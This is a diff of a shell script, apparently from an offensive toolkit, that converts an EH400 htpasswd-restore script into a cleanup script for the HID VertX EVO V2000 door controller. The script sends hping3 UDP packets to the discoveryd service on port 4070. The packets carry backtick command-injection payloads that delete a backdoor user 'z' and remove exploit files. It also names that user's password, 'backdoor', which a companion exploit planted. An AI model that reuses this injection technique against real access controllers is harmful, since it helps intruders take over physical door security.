@@ -6,10 +6,10 @@
 # exfil.co									#
 #                                                                               #
 #	###########################################################		#
-#	# HID Discoveryd htpasswd modifier for the Edge EVO EH400 #		#
+#	# HID Discoveryd clean up script for the VertX EVO V2000  #		#
 #	#                                                         #		#
-#	#    Restores the htpasswd file from backup created by    #		#
-#	#              the EH400-exploit.sh script.               #		#
+#	#      Removes the 'z' user and removes exploit files     #		#
+#	#        created by the VertX2k-exploit.sh script.        #		#
 #	###########################################################		#
 #										#
 #	This program is free software: you can redistribute it and/or modify	#
@@ -29,8 +29,8 @@
 
 echo -e "\e[1;31m############################################################\e[0m"
 echo -e "\e[1;31m#\e[0m                                                          \e[1;31m#\e[0m"
-echo -e "\e[1;31m#\e[0m      This script will restore the htdigest password      \e[1;31m#\e[0m"
-echo -e "\e[1;31m#\e[0m     for the targeted Edge EVO EH400 door controller.     \e[1;31m#\e[0m"
+echo -e "\e[1;31m#\e[0m     Cleans up after VertX2k-exploit.sh to remove the     \e[1;31m#\e[0m"
+echo -e "\e[1;31m#\e[0m  'z' user and other associated files from exploitation.  \e[1;31m#\e[0m"
 echo -e "\e[1;31m#\e[0m                                                          \e[1;31m#\e[0m"
 echo -e "\e[1;31m#\e[0m            Variables need to be set manually             \e[1;31m#\e[0m"
 echo -e "\e[1;31m#\e[0m    CTRL-C now to set vars or press ENTER to continue.    \e[1;31m#\e[0m"
@@ -39,20 +39,25 @@ echo -e "\e[1;31m############################################################\e[
 read -e NULL
 
 # Set the follwoing 2 variables
-TARGET='Target IP'
-TMAC='Target MAC'
+TARGET=''
+TMAC='00:06:8E:02:54:F2'
 # 
 
 CMDEXEC=`which hping3`
 
 echo "[*] Creating Data file"
-echo 'command_blink_on;044;'${TMAC}';1`mv /tmp/htbak /etc/sysconfig/.htpasswd`;' > cleanup1.txt
+echo 'command_blink_on;044;'${TMAC}';1`deluser z`;' > cleanup1.txt
+echo 'command_blink_on;044;'${TMAC}';1`rm /tmp/z`;' > cleanup2.txt
 echo "[*] Data file created"
 echo "[*] Executing"
 
-echo "[*] Sending Payload"
+echo "[*] Sending Payload 1"
 ${CMDEXEC} -2 -p 4070 -c 1 -E cleanup1.txt -d 150 ${TARGET} 2> /dev/null
+#sleep 1s	#If first attempt was unsuccessful, uncomment this line
 echo ""
 
+echo "[*] Sending Payload 2"
+${CMDEXEC} -2 -p 4070 -c 1 -E cleanup2.txt -d 150 ${TARGET} 2> /dev/null
+echo ""
 echo "[*] Cleanup Attempt complete"
-echo "[*] Verify by attempting login https://${TARGET}/"
+echo "[*] Verify by attempting login http://${TARGET}/ with z:backdoor"
